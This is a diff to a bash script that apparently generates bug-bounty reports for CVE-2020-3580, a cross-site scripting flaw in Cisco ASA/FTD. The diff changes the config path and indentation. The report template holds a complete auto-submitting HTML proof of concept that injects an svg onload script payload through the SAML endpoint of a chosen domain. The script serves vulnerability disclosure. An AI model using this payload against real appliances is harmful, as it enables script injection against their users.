@@ -1,8 +1,8 @@
-#in order to run this script properly you need to define your username and api keys in your bashrc file 
+#in order to run this script properly you need to define your username and api keys in config.txt
 #using export username and apikey
 
-#load credentials
-. ./config.local.txt
+#load credentials and other params
+. ./config.txt
 
 if [ -z "$1" ] || [ -z "$2" ] || [ -z "$3" ] || [ -z "$4" ]
     then
@@ -33,10 +33,10 @@ then
     echo "POC URL: " $URL
 
     #replace the url from template to new POC
-	sed "s/DOMAIN/$domain/g" $postXSStemplate > $file
+    sed "s/DOMAIN/$domain/g" $postXSStemplate > $file
 
-	title='XSS due to CVE-2020-3580 ['$domain']'
-	bodySummary="Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. \n\n "
+    title='XSS due to CVE-2020-3580 ['$domain']'
+    bodySummary="Multiple vulnerabilities in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct cross-site scripting (XSS) attacks against a user of the web services interface of an affected device. \n\n "
     bodyStepsToRep="Steps To Reproduce \n\n Go to this  URL \n\n "$URL" \n\n HTML POC:\n \n <html>\n  <body>\n <script>history.pushState('', '', '/')</script>\n <form action='https://'$domain'/+CSCOE+/saml/sp/acs?tgname=a' method='POST'>\n <input type='hidden' name='SAMLResponse' value='&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;cookies&#41;&gt;'/>\n </form>\n <script>\n document.forms[0].submit();\n</script>\n</body>\n</html>\n\n"
     body="$bodySummary$bodyStepsToRep"
     impact="- An attacker could exploit these vulnerabilities by persuading a user of the interface to click a crafted link.\n - A successful exploit could allow the attacker to execute arbitrary script code in the context of the interface or allow the attacker to access sensitive, browser-based information. \n\n Note: These vulnerabilities affect only specific AnyConnect and WebVPN configurations.\n\n Supporting Material References\n https://www.exploit-db.com/exploits/47988\n https://twitter.com/sagaryadav8742/status/1275170967527006208\n"
